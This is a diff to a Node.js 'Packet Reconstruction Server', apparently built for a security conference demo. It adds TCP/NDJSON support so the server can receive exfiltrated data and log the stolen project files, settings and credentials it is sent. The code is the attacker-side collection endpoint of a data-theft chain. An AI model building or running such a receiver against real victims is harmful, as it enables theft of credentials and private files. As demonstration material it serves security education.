@@ -1,24 +1,25 @@
 #!/usr/bin/env node
 
 const dgram = require('dgram');
+const net = require('net');
 const chalk = require('chalk').default || require('chalk');
 const fs = require('fs');
+const readline = require('readline');
 
-const server = dgram.createSocket('udp4');
+const protocol = (process.env.TRANSPORT_PROTOCOL || 'TCP').toUpperCase();
+const host = process.env.TCP_HOST || '127.0.0.1';
+const port = parseInt(process.env.TCP_PORT || '41235', 10);
+
+let server;
 let packetCount = 0;
 let reconstructionBuffer = '';
 let stolenDataLog = [];
 let lastTimestamp = null;
 let serverStartTime = Date.now();
 
-server.on('error', (err) => {
-  console.log(`Server error:\n${err.stack}`);
-  server.close();
-});
-
-server.on('message', (msg, rinfo) => {
+function processData(msg, source) {
   packetCount++;
-  console.log(chalk.red(`📡 PACKET #${packetCount} from ${rinfo.address}:${rinfo.port}`));
+  console.log(chalk.red(`📡 PACKET #${packetCount} from ${source}`));
   console.log(chalk.yellow(`   Size: ${msg.length} bytes`));
   
   try {
@@ -172,7 +173,7 @@ server.on('message', (msg, rinfo) => {
   }
   
   console.log('');
-});
+}
 
 function processCompleteData(stolenData) {
   stolenData.forEach((item, i) => {
@@ -330,13 +331,51 @@ Successfully parsed ${stolenData.length} complete data structures from fragmente
       });
       logContent += `\n`;
     }
+    
+    // Handle actual project files data
+    if (item.data.data && typeof item.data.data === 'object') {
+      const fileCount = Object.keys(item.data.data).length;
+      if (fileCount > 0) {
+        logContent += `📂 PROJECT FILES EXTRACTED (${fileCount} files):
+`;
+        for (const [filepath, content] of Object.entries(item.data.data)) {
+          logContent += `\n   File: ${filepath}\n`;
+          logContent += `   ────────────────────────────────────────\n`;
+          if (typeof content === 'object') {
+            logContent += `   ${JSON.stringify(content, null, 2).split('\n').map(line => '   ' + line).join('\n')}\n`;
+          } else if (Array.isArray(content)) {
+            logContent += `   ${content.slice(0, 5).join('\n   ')}\n`;
+            if (content.length > 5) {
+              logContent += `   ... (${content.length - 5} more lines)\n`;
+            }
+          } else {
+            logContent += `   ${String(content).substring(0, 1000)}\n`;
+            if (String(content).length > 1000) {
+              logContent += `   ... (truncated)\n`;
+            }
+          }
+        }
+        logContent += `\n`;
+      }
+    }
 
     if (item.data.recentActivity) {
       logContent += `📝 RECENT ACTIVITY:
 `;
-      item.data.recentActivity.forEach(activity => {
-        logContent += `   • ${activity}\n`;
-      });
+      // Handle both array and non-array formats
+      if (Array.isArray(item.data.recentActivity)) {
+        item.data.recentActivity.forEach(activity => {
+          if (typeof activity === 'object') {
+            logContent += `   • ${JSON.stringify(activity, null, 2)}\n`;
+          } else {
+            logContent += `   • ${String(activity)}\n`;
+          }
+        });
+      } else if (typeof item.data.recentActivity === 'object') {
+        logContent += `   • ${JSON.stringify(item.data.recentActivity, null, 2)}\n`;
+      } else {
+        logContent += `   • ${String(item.data.recentActivity)}\n`;
+      }
       logContent += `\n`;
     }
 
@@ -483,10 +522,100 @@ Log File: ${logFilename}
   }
 }
 
-server.on('listening', () => {
-  const address = server.address();
-  console.log(chalk.green(`🎯 Packet Reconstruction Server listening on ${address.address}:${address.port}`));
-  console.log(chalk.dim('Reassembling stolen data from packet fragments...\n'));
-});
-
-server.bind(41235, '127.0.0.1');
+if (protocol === 'UDP') {
+  // UDP Server
+  server = dgram.createSocket('udp4');
+  
+  server.on('error', (err) => {
+    console.log(`UDP Server error:\n${err.stack}`);
+    server.close();
+  });
+  
+  server.on('message', (msg, rinfo) => {
+    processData(msg, `${rinfo.address}:${rinfo.port}`);
+  });
+  
+  server.on('listening', () => {
+    const address = server.address();
+    console.log(chalk.green(`🎯 Packet Reconstruction Server (UDP) listening on ${address.address}:${address.port}`));
+    console.log(chalk.dim('Reassembling stolen data from packet fragments...\n'));
+  });
+  
+  server.bind(port, host);
+  
+} else {
+  // TCP Server - processes complete NDJSON records
+  server = net.createServer((socket) => {
+    console.log(chalk.cyan(`TCP connection from ${socket.remoteAddress}:${socket.remotePort}`));
+    
+    const rl = readline.createInterface({
+      input: socket,
+      crlfDelay: Infinity
+    });
+    
+    rl.on('line', (line) => {
+      try {
+        // TCP sends complete JSON records, one per line
+        const record = JSON.parse(line);
+        console.log(chalk.green(`✅ COMPLETE RECORD received via TCP`));
+        console.log(chalk.yellow(`   Source: ${record.source}`));
+        console.log(chalk.yellow(`   Size: ${line.length} bytes`));
+        
+        if (record.data) {
+          if (record.data.projects) {
+            console.log(chalk.magenta(`   📁 Projects: ${record.data.projectCount || 'N/A'}`));
+          }
+          if (record.data.settings) {
+            const keys = Object.keys(record.data.settings);
+            console.log(chalk.cyan(`   ⚙️  Settings (${keys.length} keys): ${keys.slice(0,3).join(', ')}...`));
+          }
+          if (record.data.credentials) {
+            console.log(chalk.red(`   🔑 Credentials found: ${record.data.credentials.length} items`));
+          }
+        }
+        
+        // Store complete record
+        stolenDataLog.push({
+          timestamp: new Date().toISOString(),
+          method: 'tcp_direct',
+          completeData: [record]
+        });
+        
+        packetCount++;
+        
+        // Write to file immediately for conference demo impact
+        const allData = stolenDataLog.map(log => log.completeData).flat();
+        writeReconstructionLog(allData);
+        console.log(chalk.red(`🚨 STOLEN DATA LOGGED: ${allData.length} records captured`));
+        console.log(chalk.yellow(`📁 Check: stolen-data-reconstruction.log`));
+        
+        console.log('');
+        
+      } catch (e) {
+        console.log(chalk.red(`Error parsing TCP data: ${e.message}`));
+        console.log(chalk.dim(`Raw data: ${line.substring(0, 200)}...`));
+      }
+    });
+    
+    socket.on('error', (err) => {
+      console.log(chalk.yellow(`TCP connection error: ${err.message}`));
+    });
+    
+    socket.on('end', () => {
+      console.log(chalk.dim(`TCP connection closed from ${socket.remoteAddress}`));
+      if (stolenDataLog.length > 0) {
+        writeReconstructionLog(stolenDataLog.map(log => log.completeData).flat());
+      }
+    });
+  });
+  
+  server.on('error', (err) => {
+    console.log(`TCP Server error:\n${err.stack}`);
+    process.exit(1);
+  });
+  
+  server.listen(port, host, () => {
+    console.log(chalk.green(`🎯 Packet Reconstruction Server (TCP/NDJSON) listening on ${host}:${port}`));
+    console.log(chalk.dim('Receiving complete records via TCP...\n'));
+  });
+}
